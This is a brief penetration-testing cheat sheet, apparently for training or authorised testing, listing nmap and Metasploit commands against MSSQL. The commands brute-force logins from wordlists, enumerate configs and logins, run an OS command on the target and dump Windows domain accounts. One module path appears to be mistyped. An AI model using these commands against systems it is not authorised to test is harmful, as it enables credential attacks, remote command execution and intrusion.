##### Enumerate MSSQL Server
```
nmap -p1433 --script ms-sql-info IP
```

##### Discover valid Users and their Passwords
```
use auxiliary/scanner/mssql/mssql_login
set rhosts IP
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false
run
```

##### Enumerate MSSQL configs
By default in Metasploit `sa` user is set to **USERNAME** and **PASSWORD** is empty ''
```
use auxiliary/admin/mssql/mssql_enum
set rhosts IP
run
```

##### Enumerate and Extract all MSSQL Users
```
use auxiliary/admin/mssql/mssql_enum_sql_logins
set rhosts IP
run
```

##### Execute a Command on the Target
```
use auxiliary/admin/mssql/mssql_exec
set rhosts IP
set cmd whoami
run
```

##### Enumerate all available System Users
This module dumps the information such as Windows domain users, groups, and computer accounts
```
use auxiliary/admin/mssql_enum_domain_accounts
set rhosts IP
run
```